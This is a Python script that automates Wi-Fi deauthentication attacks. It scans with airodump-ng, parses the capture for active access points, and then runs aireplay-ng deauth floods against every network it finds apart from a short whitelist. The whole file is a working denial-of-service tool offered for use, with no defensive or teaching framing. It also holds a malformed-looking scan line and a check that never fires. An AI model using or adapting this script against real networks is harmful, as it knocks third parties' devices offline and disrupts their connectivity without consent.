#!/usr/bin/python3
import sys
import subprocess
import csv
import glob
import os
import re

scan_interface="wlan1mon"
deauth_interface="wlan0"
timeout_deauth=2
timeout_scan=30
whitelist_essid=["foobar","foobar247"]
whitelist_bssid=["AA:AA:AA:AA:AA:AA","BB:BB:BB:BB:BB:BB"]
tmp_dir="/tmp/w42w"


def cleanup_tmp(dir):
  # Cleanup tmp dir
  files = glob.glob(dir+"*")
  # Delete each file
  for file in files:
    os.remove(file)
  print("-> Cleaned up tmp directory "+dir)

def process_kismet_csv(file_path):
  data = set()
  with open(file_path, 'r') as file:
    #Network;NetType;ESSID;BSSID;Info;Channel;Cloaked;Encryption;Decrypted;MaxRate;MaxSeenRate;Beacon;LLC;Data;Crypt;Weak;Total;Carrier;Encoding;FirstTime;LastTime;BestQuality;BestSignal;BestNoise;GPSMinLat;GPSMinLon;GPSMinAlt;GPSMinSpd;GPSMaxLat;GPSMaxLon;GPSMaxAlt;GPSMaxSpd;GPSBestLat;GPSBestLon;GPSBestAlt;DataSize;IPType;IP;
    #1;infrastructure;;6C:5A:B0:1B:E2:8F;;2;No;WPA3,AES-CCM,SAE;No;360.0;0;17;0;3;0;0;3;;;Wed Jul 17 14:52:16 2024;Wed Jul 17 14:52:25 2024;-56;0;0;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0.000000;0;0;0.0.0.0;
    #['Network', 'NetType', 'ESSID', 'BSSID', 'Info', 'Channel', 'Cloaked', 'Encryption', 'Decrypted', 'MaxRate', 'MaxSeenRate', 'Beacon', 'LLC', 'Data', 'Crypt', 'Weak', 'Total', 'Carrier', 'Encoding', 'FirstTime', 'LastTime', 'BestQuality', 'BestSignal', 'BestNoise', 'GPSMinLat', 'GPSMinLon', 'GPSMinAlt', 'GPSMinSpd', 'GPSMaxLat', 'GPSMaxLon', 'GPSMaxAlt', 'GPSMaxSpd', 'GPSBestLat', 'GPSBestLon', 'GPSBestAlt', 'DataSize', 'IPType', 'IP', '']
    reader = csv.reader(file, delimiter=';')
    for row in reader:
      if not "BSSID" in row and row[13]!="0": # ignore header and rows without traffic (13=data)
        if row[2] in whitelist_essid or row[3] in whitelist_bssid:
          print("-> Ignoring whitelisted entry "+row[3])
        else:
          data.add((row[3],row[5],row[2])) #3=BSSID   5=channel   2=ESSID
          print("-> Adding entry "+row[3] + " " +row[2])
  return sorted(data)

def check_interfaces():
  # Run iwconfig command and capture output
  output = subprocess.check_output(['iwconfig'], stderr=subprocess.DEVNULL).decode('utf-8')
  # Check if "wlan1" exists in the output using regular expressions
  if not re.search(deauth_interface, output):
      print(deauth_interface+" does not exist.")
      sys.exit(1)
  if not re.search(scan_interface, output):
      print(scan_interface+" does not exist. Trying to enable "+scan_interface[:-3])
      try:
        subprocess.run(["airmon-ng","start",scan_interface[:-3]],stdout=subprocess.DEVNULL)
      except:
        pass
      sys.exit(1)

if __name__ == "__main__":
  check_interfaces()
  # cleanup tmp dir
  cleanup_tmp(tmp_dir)

  # scan for clients
  print("-> Scanning for clients")
  try:
    subprocess.TimeoutExpired:subprocess.run(["airodump-ng","-a",scan_interface,"-w",tmp_dir,"--background","0","--write-interval","1"], stdout=subprocess.DEVNULL, timeout=timeout_scan)
  except:
    pass

  for r in process_kismet_csv(tmp_dir+"-01.kismet.csv"):
    if len(r) == 0:
      print("--> nothing to do")
    # 0=BSSID (MAC) 1=channel 2=ESSID
    else:
      print("--> Processing "+r[0]+"/"+r[2]+" on channel "+r[1])
      # set channel
      print("---> Changing channel to "+r[1])
      subprocess.run(["iwconfig",deauth_interface,"channel",r[1]], stdout=subprocess.DEVNULL)

      # run aireplay-ng
      print("---> Running de-auth on "+r[0]+" "+r[2])
      try:
        subprocess.run(["aireplay-ng","--deauth","0","-a",r[0],deauth_interface,"--ignore-negative-one"], timeout=timeout_deauth,stdout=subprocess.DEVNULL)
      except:
        pass
